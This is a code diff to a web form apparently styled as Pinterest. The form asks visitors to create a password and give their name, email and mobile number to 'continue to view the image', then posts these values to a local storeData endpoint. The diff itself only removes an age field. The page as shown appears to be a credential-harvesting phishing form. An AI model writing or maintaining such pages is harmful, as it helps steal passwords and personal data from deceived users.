@@ -32,9 +32,6 @@
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Create a password" required>
                 </div>
-                <div class="input-group">
-                    <input type="number" id="age" placeholder="Age" required>
-                </div>
                 <button type="submit" class="btn btn-pinterest">Continue to view the image</button>
             </form>
         </div>
@@ -59,7 +56,6 @@
             const lastName = document.getElementById('lastName').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const age = document.getElementById('age').value;
 
             // Send data to the server using fetch
             fetch('http://localhost:3000/storeData', {
@@ -73,7 +69,6 @@
                     mobileNumber: mobileNumber,
                     email: email,
                     password: password,
-                    age: age,
                 }),
             })
             .then(response => {
